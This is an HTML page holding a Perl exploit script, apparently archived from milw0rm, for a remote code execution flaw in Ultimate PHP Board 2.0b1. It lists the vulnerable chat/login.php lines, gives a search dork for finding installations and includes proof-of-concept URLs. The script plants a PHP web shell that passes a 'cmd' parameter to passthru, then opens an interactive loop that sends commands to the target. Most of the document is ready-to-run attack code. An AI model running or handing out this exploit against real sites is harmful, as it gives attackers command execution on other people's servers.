<html><head><title>Ultimate PHP Board <= 2.0b1 (chat/login.php) Code Execution Exploit</title></head><pre>#!/usr/bin/perl
# +-------------------------------------------------------------------------------------------
# + Ultimate PHP Board &lt;= 2.0b1 (chat/login.php) Remote Code Execution Vulnerability
# +-------------------------------------------------------------------------------------------
# + Affected Software .: Ultimate PHP Board (myUPB) &lt;= 2.0b1
# + Vendor ............: http://www.myupb.com/
# + Download ..........: http://fileserv.myupb.com/upb2.0B1.zip
# + Description .......: &quot;Ultimate PHP Board is a free discussion forum that can be used as a free alternative to UBB or vBulletin&quot;
# + Dork ..............: &quot;Powered by UPB&quot;
# + Class .............: Remote Code Execution
# + Risk ..............: High (Remote Code Execution)
# + Found By ..........: nuffsaid &lt;nuffsaid[at]newbslove.us&gt;
# +-------------------------------------------------------------------------------------------
# + Details:
# + Ultimate PHP Board chat/login.php does not sanatize the $username ($_GET[&quot;username&quot;])
# + variable before writing it to chat/text.php on line 28, arbitrary php code can be written
# + then executed by visiting chat/text.php.
# +
# + Vulnerable Code: 
# + chat/login.php, line(s) 23-28:
# + -&gt; 23: $filename = &quot;text.php&quot;;
# + -&gt; 24: $fileAr= file($filename);
# + -&gt; 25: exec(&quot;cat /dev/null &gt; '$filename'&quot;);
# + -&gt; 26: $fd = fopen( $filename, &quot;a+&quot; );
# + -&gt; 27: $filemessage = &quot;&lt;font size='$font_s' face='$font_face' color='$font_color_main'&gt;&lt;b&gt;$username entered at $date&lt;/b&gt;&lt;/font&gt;&lt;br&gt;\n&quot;;
# + -&gt; 28: fputs($fd,$filemessage);
# +
# + Proof of Concept:
# + http://[target]/[path]/chat/login.php?option=chat&amp;username=[code]
# + http://[target]/[path]/chat/text.php
# +-------------------------------------------------------------------------------------------

use Getopt::Long;
use URI::Escape;
use IO::Socket;

$code = &quot;&lt;?php if (isset(\$_GET[cmd])) passthru(\$_GET[cmd]); die; ?&gt;&quot;;

main();

sub usage
{
    print &quot;\nUltimate PHP Board &lt;= 2.0b1 Remote Code Execution Exploit\n&quot;;
    print &quot;nuffsaid &lt;nuffsaid[at]newbslove.us&gt;\n&quot;;
    print &quot;-h, --host\ttarget host\t(example.com)\n&quot;;
    print &quot;-d, --dir\tinstall dir\t(/forum)\n&quot;;
    exit;
}

sub main
{
    GetOptions ('h|host=s' =&gt; \$host,'d|dir=s' =&gt; \$dir);
    usage() unless $host;
    $dir = &quot;/forum&quot; unless $dir;
    $sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;,PeerAddr=&gt;&quot;$host&quot;,PeerPort=&gt;&quot;80&quot;)
     or die &quot;\nconnect() failed.\n&quot;;
    
    print &quot;\nconnected to &quot;.$host.&quot;, sending data.\n&quot;;
    $sendurl = uri_escape($code);
    print $sock &quot;GET &quot;.$dir.&quot;/chat/login.php?option=chat&amp;username=&quot;.$sendurl.&quot; HTTP/1.1\n&quot;;
    print $sock &quot;Host: &quot;.$host.&quot;\n&quot;;
    print $sock &quot;Accept: */*\n&quot;;
    print $sock &quot;Connection: close\n\n&quot;;
    print &quot;\n&quot;;
    print &quot;attempted to create php shell, server response:\n\n&quot;;
    while($recvd = &lt;$sock&gt;)
    {
        print &quot; &quot;.$recvd.&quot;&quot;;
    }
    
    while($cmd !~ &quot;~quit&quot;)
    {
        print &quot;\n\n-&gt; &quot;;
        $cmd = &lt;STDIN&gt;;
        if ($cmd !~ &quot;~quit&quot;)
        {
          $sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;,PeerAddr=&gt;&quot;$host&quot;,PeerPort=&gt;&quot;80&quot;)
           or die &quot;connect() failed.\n&quot;;
          $sendurl = uri_escape($cmd);
          print $sock &quot;GET &quot;.$dir.&quot;/chat/text.php?cmd=&quot;.$sendurl.&quot; HTTP/1.1\n&quot;;
          print $sock &quot;Host: &quot;.$host.&quot;\n&quot;;
          print $sock &quot;Accept: */*\n&quot;;
          print $sock &quot;Connection: close\n\n&quot;;
          print &quot;\n&quot;;
          while($recvd = &lt;$sock&gt;)
          {
              print $recvd;
          }
        }
    }
    exit;
}

# milw0rm.com [2006-12-24]</pre></html>